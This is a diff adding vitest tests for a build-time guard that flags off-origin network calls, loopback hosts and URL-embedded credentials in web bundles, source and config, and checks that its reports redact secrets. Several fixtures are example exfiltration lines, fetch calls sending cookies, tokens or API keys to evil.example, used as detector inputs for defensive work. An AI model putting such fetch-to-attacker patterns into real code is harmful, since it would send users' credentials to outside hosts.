@@ -1,10 +1,16 @@
 import { describe, expect, it } from 'vitest';
+// @ts-expect-error The repo intentionally carries no global Node typings; this
+// test exercises the executable guard's stdout/stderr boundary.
+import { spawnSync } from 'node:child_process';
+import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
 
 import packageJson from '../package.json';
 
 // The production checker is an executable JavaScript module rather than app code.
 // @ts-expect-error No declaration file is needed for this build-time module.
-import { decodeObfuscation, emittedViolationsIn, EMITTED_TEXT_EXTENSIONS } from '../scripts/check-no-direct-exposure.mjs';
+import { apiConfigViolationsIn, violationsIn, decodeObfuscation, emittedViolationsIn, EMITTED_TEXT_EXTENSIONS } from '../scripts/check-no-direct-exposure.mjs';
 
 /**
  * Issue #55, AC2/AC3/AC5.
@@ -26,9 +32,28 @@ interface Violation {
   value: string;
 }
 
+declare const process: {
+  cwd(): string;
+  execPath: string;
+};
+
 const rules = (hits: Violation[]): string[] => hits.map((hit) => hit.rule);
 const scan = (text: string, only?: Set<string>): Violation[] =>
   emittedViolationsIn(text, 'assets/index-a1b2c3.js', only ?? null) as Violation[];
+const GUARD = join(process.cwd(), 'scripts/check-no-direct-exposure.mjs');
+
+function capturedCliOutput(text: string, asset = 'index.js'): string {
+  const root = mkdtempSync(join(tmpdir(), 'gw-emitted-redaction-'));
+  try {
+    mkdirSync(join(root, 'assets'));
+    writeFileSync(join(root, 'assets', asset), text);
+    const result = spawnSync(process.execPath, [GUARD, '--emitted', root], { encoding: 'utf8' });
+    expect(result.status).toBe(1);
+    return `${result.stdout}${result.stderr}`;
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+}
 
 describe('emitted artifact is scanned for off-origin destinations (#55 AC2)', () => {
   it('covers every emitted text form the acceptance criterion names', () => {
@@ -50,10 +75,10 @@ describe('emitted artifact is scanned for off-origin destinations (#55 AC2)', ()
     expect(hits.every((hit) => !hit.value.includes('hunter2'))).toBe(true);
   });
 
-  it('reports the rule, the excerpt, and the reason on every finding', () => {
+  it('reports the rule, a safe destination, and the reason on every finding', () => {
     const [hit] = scan('fetch("https://evil.example/collect")');
     expect(hit.rule).toContain('off-origin');
-    expect(hit.value).toContain('evil.example');
+    expect(hit.value).toBe('destination=https://evil.example');
     expect(hit.why).not.toHaveLength(0);
   });
 
@@ -148,6 +173,26 @@ describe('credentials never attach off-origin (#55 AC3)', () => {
     const hits = scan('fetch("https://u:hunter2@evil.example/v1",{credentials:"include"})');
     expect(hits).not.toHaveLength(0);
     expect(hits.every((hit) => !hit.value.includes('hunter2')), JSON.stringify(hits)).toBe(true);
+  });
+
+  it('keeps synthetic credential sentinels out of helper findings and CLI output', () => {
+    const cases = [
+      'const Cookie="SYNTH_COOKIE_7e91";fetch("https://evil.example/v1",{headers:{Cookie}})',
+      'const Authorization="Bearer SYNTH_AUTH_7e91";fetch("https://evil.example/v1")',
+      'const key="SYNTH_API_KEY_7e91";fetch("https://evil.example/v1",{headers:{"X-Api-Key":key}})',
+      'fetch("https://user:SYNTH_USERINFO_7e91@evil.example/v1")',
+      'fetch("https:%2f%2fuser:SYNTH_DECODED_7e91@evil.example/v1")',
+    ];
+    for (const source of cases) {
+      const marker = source.match(/SYNTH_[A-Z_0-9]+/)?.[0];
+      expect(marker).toBeTruthy();
+      const hits = scan(source);
+      expect(rules(hits).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
+      expect(JSON.stringify(hits)).not.toContain(marker!);
+      const output = capturedCliOutput(source);
+      expect(output).toContain('[emitted-off-origin-dial');
+      expect(output).not.toContain(marker!);
+    }
   });
 
   it('leaves the correct same-origin credentialed call alone', () => {
@@ -261,5 +306,284 @@ describe('where the emitted scan is enforced (#55 AC2)', () => {
   it('offers the emitted scan for each lane as its own entry point', () => {
     expect(scripts['check:emitted']).toContain('--emitted dist/client');
     expect(scripts['check:emitted-public']).toContain('--emitted dist/public');
+  });
+});
+
+describe('diagnostic output boundary (#285)', () => {
+  const marker = 'SYNTH_CUTOFF_285';
+  it.each([299, 300, 301, 600])('handles complete userinfo beyond %i characters', (size) => {
+    const source = `fetch("https://${marker}${'x'.repeat(size)}:password@evil.example/path?token=${marker}")`;
+    const hits = scan(source);
+    expect(rules(hits)).toContain('emitted-off-origin-dial');
+    expect(hits.find((hit) => hit.rule === 'emitted-off-origin-dial')?.value)
+      .toBe('destination=https://evil.example');
+    expect(JSON.stringify(hits)).not.toContain(marker);
+    const output = capturedCliOutput(source);
+    expect(output).toContain('[emitted-off-origin-dial]');
+    expect(output).not.toContain(marker);
+  });
+  it('retains distinct loopback and binary userinfo destinations', () => {
+    const loopbacks = scan('127.0.0.1:8791 localhost:8100', new Set(['emitted-loopback-host']));
+    expect(loopbacks.map((hit) => hit.value)).toEqual([
+      'destination=http://127.0.0.1:8791', 'destination=http://localhost:8100',
+    ]);
+    const userinfo = scan(`https://user:${marker}@one.example/x https://user:${marker}@two.example/y`,
+      new Set(['emitted-url-userinfo']));
+    expect(userinfo.map((hit) => hit.value)).toEqual([
+      'destination=off-origin; match=0 (original)', 'destination=https://two.example',
+    ]);
+    expect(JSON.stringify(userinfo)).not.toContain(marker);
+  });
+  it('omits adjacent credentials from source and API-config findings', () => {
+    const source = `const Cookie="${marker}"; fetch("http://127.0.0.1:8791/path?token=${marker}")`;
+    const hits = violationsIn(source, 'src/example.ts') as Violation[];
+    expect(rules(hits)).toContain('loopback-host');
+    expect(JSON.stringify(hits)).not.toContain(marker);
+    const config = apiConfigViolationsIn(`VITE_API_BASE=https://user:${marker}@evil.example/?token=${marker}`) as Violation[];
+    expect(rules(config)).toContain('api-config-userinfo');
+    expect(JSON.stringify(config)).not.toContain(marker);
+  });
+  it('exercises the default source/config CLI without printing credentials', () => {
+    const root = mkdtempSync(join(tmpdir(), 'gw-source-redaction-'));
+    try {
+      mkdirSync(join(root, 'scripts'));
+      mkdirSync(join(root, 'src'));
+      writeFileSync(join(root, 'scripts/check-no-direct-exposure.mjs'), readFileSync(GUARD, 'utf8'));
+      writeFileSync(join(root, 'src/example.ts'), `const Cookie="${marker}";fetch("http://127.0.0.1:8791/path")`);
+      writeFileSync(join(root, '.env.example'), `VITE_API_BASE=https://user:${marker}@evil.example/?token=${marker}`);
+      const result = spawnSync(process.execPath, [join(root, 'scripts/check-no-direct-exposure.mjs')], { encoding: 'utf8' });
+      expect(result.status).toBe(1);
+      const output = `${result.stdout}${result.stderr}`;
+      expect(output).toContain('[loopback-host]');
+      expect(output).toContain('[api-config-userinfo]');
+      expect(output).not.toContain(marker);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+});
+
+describe('opaque findings retain their identities (#285)', () => {
+  it('retains both loopbacks before a later credentialed URL', () => {
+    const source = 'http://127.0.0.1:8791/a http://localhost:8100/b https://user:SYNTH_PASSWORD_285@evil.example/x';
+    const hits = scan(source, new Set(['emitted-loopback-host']));
+    expect(hits).toHaveLength(2);
+    expect(new Set(hits.map((hit) => hit.value)).size).toBe(2);
+    expect(JSON.stringify(hits).toLowerCase()).not.toContain('synth_password_285');
+    const output = capturedCliOutput(source, 'metadata.png');
+    expect(output.match(/\[emitted-loopback-host\]/g)).toHaveLength(2);
+  });
+  it('retains three complete credentialed URL findings', () => {
+    const source = ['one', 'two', 'three'].map((host) => `https://user:SYNTH_PASSWORD_285@${host}.example/x`).join(' ');
+    const hits = scan(source, new Set(['emitted-url-userinfo']));
+    expect(hits).toHaveLength(3);
+    expect(new Set(hits.map((hit) => hit.value)).size).toBe(3);
+    expect(JSON.stringify(hits).toLowerCase()).not.toContain('synth_password_285');
+    const output = capturedCliOutput(source, 'metadata.png');
+    expect(output.match(/\[emitted-url-userinfo\]/g)).toHaveLength(3);
+  });
+  it('retains separate ambiguous raw and decoded dials without printing userinfo', () => {
+    for (const delimiter of [')', '%22']) {
+      const source = ['one', 'two', 'three'].map((host) => `fetch("https://SYNTH_USER_285${delimiter}:password@${host}.example/x")`).join(';');
+      const hits = scan(source).filter((hit) => hit.rule.startsWith('emitted-off-origin-dial'));
+      expect(hits.length).toBeGreaterThanOrEqual(3);
+      expect(new Set(hits.map((hit) => hit.value)).size).toBeGreaterThanOrEqual(3);
+      expect(JSON.stringify(hits).toLowerCase()).not.toContain('synth_user_285');
+    }
+  });
+  it('still deduplicates repeated proven noncredentialed origins', () => {
+    const hits = scan('fetch("https://one.example/a");fetch("https://one.example/b")')
+      .filter((hit) => hit.rule === 'emitted-off-origin-dial');
+    expect(hits).toHaveLength(1);
+    expect(hits[0].value).toBe('destination=https://one.example');
+  });
+});
+
+describe('raw authority delimiters cannot expose userinfo (#285)', () => {
+  it.each([' ', '"', "'", '`', ')', '>'])('never parses the reviewer raw %j prefix as a host', (delimiter) => {
+    const marker = 'SYNTH_USER_285';
+    const url = `https://${marker}${delimiter}:password@evil.example/x`;
+    const source = `fetch("${url}")`;
+    const hits = scan(source);
+    expect(rules(hits).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
+    const config = apiConfigViolationsIn(`VITE_API_BASE=${url}`) as Violation[];
+    expect(config.length).toBeGreaterThan(0);
+    const bare = violationsIn(source, 'src/example.ts') as Violation[];
+    const binary = scan(source, new Set(['emitted-loopback-host', 'emitted-url-userinfo']));
+    if (delimiter === ')' || delimiter === '>') {
+      expect(bare.length).toBeGreaterThan(0);
+      expect(binary.length).toBeGreaterThan(0);
+    }
+    for (const report of [hits, config, bare, binary]) {
+      expect(JSON.stringify(report).toLowerCase()).not.toContain(marker.toLowerCase());
+    }
+  });
+  const delimiters = Array.from({ length: 95 }, (_, index) => String.fromCharCode(index + 32));
+  it.each(delimiters)('keeps raw %j private in every report route', (delimiter) => {
+    const marker = 'SYNTH_USER_285';
+    const credential = `${marker}:localhost:12345${delimiter}`;
+    const url = `https://${credential}:password@evil.example/x`;
+    const source = `fetch("${url}")`;
+    const emitted = scan(source);
+    expect(rules(emitted).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
+    const bare = violationsIn(source, 'src/example.ts') as Violation[];
+    expect(bare.length).toBeGreaterThan(0);
+    const binary = scan(source, new Set(['emitted-loopback-host', 'emitted-url-userinfo']));
+    expect(binary.length).toBeGreaterThan(0);
+    const config = apiConfigViolationsIn(`VITE_API_BASE=${url}`) as Violation[];
+    expect(config.length).toBeGreaterThan(0);
+    for (const report of [emitted, bare, binary, config]) {
+      expect(JSON.stringify(report).toLowerCase()).not.toContain(marker.toLowerCase());
+      expect(JSON.stringify(report).toLowerCase()).not.toContain('localhost:12345');
+    }
+  });
+  it.each([' ', '"', "'", '`', ')', '>'])('omits raw %j from default/text/binary CLI output', (delimiter) => {
+    const marker = 'SYNTH_USER_285';
+    const url = `https://${marker}:localhost:12345${delimiter}:password@evil.example/x`;
+    const source = `fetch("${url}")`;
+    for (const asset of ['index.js', 'metadata.png']) {
+      const output = capturedCliOutput(source, asset).toLowerCase();
+      expect(output).toContain('[emitted-');
+      expect(output).not.toContain(marker.toLowerCase());
+      expect(output).not.toContain('localhost:12345');
+    }
+    const root = mkdtempSync(join(tmpdir(), 'gw-raw-authority-'));
+    try {
+      mkdirSync(join(root, 'scripts'));
+      mkdirSync(join(root, 'src'));
+      writeFileSync(join(root, 'scripts/check-no-direct-exposure.mjs'), readFileSync(GUARD, 'utf8'));
+      writeFileSync(join(root, 'src/example.ts'), source);
+      writeFileSync(join(root, '.env.example'), `VITE_API_BASE=${url}`);
+      const result = spawnSync(process.execPath, [join(root, 'scripts/check-no-direct-exposure.mjs')], { encoding: 'utf8' });
+      expect(result.status).toBe(1);
+      const output = `${result.stdout}${result.stderr}`.toLowerCase();
+      expect(output).toContain('[loopback-host]');
+      expect(output).toMatch(/\[api-config-[a-z-]+\]/);
+      expect(output).not.toContain(marker.toLowerCase());
+      expect(output).not.toContain('localhost:12345');
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+});
+
+describe('userinfo cannot become destination context (#285)', () => {
+  it.each(['localhost:12345', '127.0.0.1:12345', '10.20.30.40:12345',
+    '192.168.1.23:12345', 'http://localhost:12345', 'https://127.0.0.1:23456',
+    'prefix-localhost:12345', 'prefix-10.20.30.40:12345'])('%s stays private inside either userinfo field', (credential) => {
+    for (const userinfo of [`SYNTH_USER_285:${credential}`, `${credential}:SYNTH_PASSWORD_285`]) {
+      const source = `fetch("https://${userinfo}@evil.example/x")`;
+      const hits = scan(source);
+      expect(rules(hits).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
+      const sourceHits = violationsIn(source, 'src/example.ts') as Violation[];
+      expect(sourceHits.length).toBeGreaterThan(0);
+      const binaryHits = scan(source, new Set(['emitted-loopback-host', 'emitted-url-userinfo']));
+      expect(binaryHits.length).toBeGreaterThan(0);
+      const config = apiConfigViolationsIn(`VITE_API_BASE=https://${userinfo}@evil.example/x`) as Violation[];
+      expect(config.length).toBeGreaterThan(0);
+      for (const report of [hits, sourceHits, binaryHits, config]) {
+        const output = JSON.stringify(report).toLowerCase();
+        for (const secret of [credential, 'SYNTH_USER_285', 'SYNTH_PASSWORD_285']) {
+          expect(output).not.toContain(secret.toLowerCase());
+        }
+      }
+      for (const asset of ['index.js', 'metadata.png']) {
+        const output = capturedCliOutput(source, asset).toLowerCase();
+        expect(output).toContain('[emitted-');
+        for (const secret of [credential, 'SYNTH_USER_285', 'SYNTH_PASSWORD_285']) {
+          expect(output).not.toContain(secret.toLowerCase());
+        }
+      }
+    }
+  });
+});
+
+describe('encoded and binary diagnostic output (#285)', () => {
+  const encodedCharacters = Array.from({ length: 95 }, (_, index) => index + 32)
+    .flatMap((code) => {
+      const hex = code.toString(16).padStart(2, '0');
+      return [`%${hex}`, `%25${hex}`, String.raw`\x${hex}`, String.raw`\u00${hex}`];
+    });
+  it.each(encodedCharacters)('keeps encoded character %s out of reported authority', (encoded) => {
+    const marker = 'SYNTH_USER_285';
+    const source = `fetch("https://${marker}${encoded}:password@evil.example/x")`;
+    const hits = scan(source);
+    expect(rules(hits).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
+    expect(JSON.stringify(hits).toLowerCase()).not.toContain(marker.toLowerCase());
+    const binary = scan(source, new Set(['emitted-url-userinfo']));
+    expect(binary.length).toBeGreaterThan(0);
+    expect(JSON.stringify(binary).toLowerCase()).not.toContain(marker.toLowerCase());
+  });
+  it.each(['%20', '%22', '%27', '%60', '%29', '%3e', String.raw`\x22`, String.raw`\u0020`])(
+    'omits decoded delimiter %s from emitted and binary CLI output', (encoded) => {
+      const marker = 'SYNTH_USER_285';
+      const source = `fetch("https://${marker}${encoded}:password@evil.example/x")`;
+      for (const asset of ['index.js', 'metadata.png']) {
+        const output = capturedCliOutput(source, asset);
+        expect(output).toMatch(/\[emitted-(off-origin-dial|url-userinfo)/);
+        expect(output.toLowerCase()).not.toContain(marker.toLowerCase());
+      }
+    },
+  );
+  it.each(['%2f', '%252f', '%5c', String.raw`\x2f`, String.raw`\u002f`])(
+    'never reinterprets userinfo containing %s as a hostname', (separator) => {
+      const marker = 'SYNTH_USER_285';
+      const url = `https://${marker}${separator}:password@evil.example/x`;
+      const source = `fetch("${url}")`;
+      const hits = scan(source);
+      expect(rules(hits)).toContain('emitted-off-origin-dial');
+      expect(JSON.stringify(hits).toLowerCase()).not.toContain(marker.toLowerCase());
+      const output = capturedCliOutput(source);
+      expect(output).toContain('[emitted-off-origin-dial]');
+      expect(output.toLowerCase()).not.toContain(marker.toLowerCase());
+      const config = apiConfigViolationsIn(`VITE_API_BASE=${url}`) as Violation[];
+      expect(rules(config).some((rule) => rule.startsWith('api-config-'))).toBe(true);
+      expect(JSON.stringify(config).toLowerCase()).not.toContain(marker.toLowerCase());
+      const sourceHits = violationsIn(source, 'src/example.ts') as Violation[];
+      if (separator.startsWith('%')) expect(rules(sourceHits)).toContain('url-userinfo');
+      expect(JSON.stringify(sourceHits).toLowerCase()).not.toContain(marker.toLowerCase());
+      const root = mkdtempSync(join(tmpdir(), 'gw-separator-redaction-'));
+      try {
+        mkdirSync(join(root, 'scripts'));
+        mkdirSync(join(root, 'src'));
+        writeFileSync(join(root, 'scripts/check-no-direct-exposure.mjs'), readFileSync(GUARD, 'utf8'));
+        writeFileSync(join(root, 'src/example.ts'), source);
+        writeFileSync(join(root, '.env.example'), `VITE_API_BASE=${url}`);
+        const result = spawnSync(process.execPath, [join(root, 'scripts/check-no-direct-exposure.mjs')], { encoding: 'utf8' });
+        expect(result.status).toBe(1);
+        const defaultOutput = `${result.stdout}${result.stderr}`;
+        if (separator.startsWith('%')) expect(defaultOutput).toContain('[url-userinfo]');
+        expect(defaultOutput).toMatch(/\[api-config-[a-z-]+\]/);
+        expect(defaultOutput.toLowerCase()).not.toContain(marker.toLowerCase());
+      } finally {
+        rmSync(root, { recursive: true, force: true });
+      }
+      const binary = capturedCliOutput(url, 'metadata.png');
+      expect(binary).toContain('[emitted-url-userinfo]');
+      expect(binary.toLowerCase()).not.toContain(marker.toLowerCase());
+    },
+  );
+  it('keeps long encoded userinfo out of helper and emitted CLI diagnostics', () => {
+    const marker = 'SYNTH_ENCODED_285';
+    const source = `fetch("https:%2f%2f${marker}${'x'.repeat(600)}:password@evil.example/x")`;
+    const hits = scan(source);
+    expect(rules(hits)).toContain('emitted-off-origin-dial');
+    expect(hits.find((hit) => hit.rule === 'emitted-off-origin-dial')?.value)
+      .toBe('destination=off-origin; match=0 (decoded)');
+    expect(JSON.stringify(hits)).not.toContain(marker);
+    const output = capturedCliOutput(source);
+    expect(output).toContain('[emitted-off-origin-dial]');
+    expect(output).not.toContain(marker);
+  });
+  it('reports both binary origins and loopback ports without retaining userinfo', () => {
+    const marker = 'SYNTH_BINARY_285';
+    const source = `\x00https://user:${marker}@one.example/x https://user:${marker}@two.example/y 127.0.0.1:8791 localhost:8100\x00`;
+    const output = capturedCliOutput(source, 'metadata.png');
+    for (const destination of ['off-origin', 'https://two.example', 'http://127.0.0.1:8791', 'http://localhost:8100']) {
+      expect(output).toContain(`destination=${destination}`);
+    }
+    expect(output).toContain('[emitted-url-userinfo]');
+    expect(output).toContain('[emitted-loopback-host]');
+    expect(output).not.toContain(marker);
   });
 });
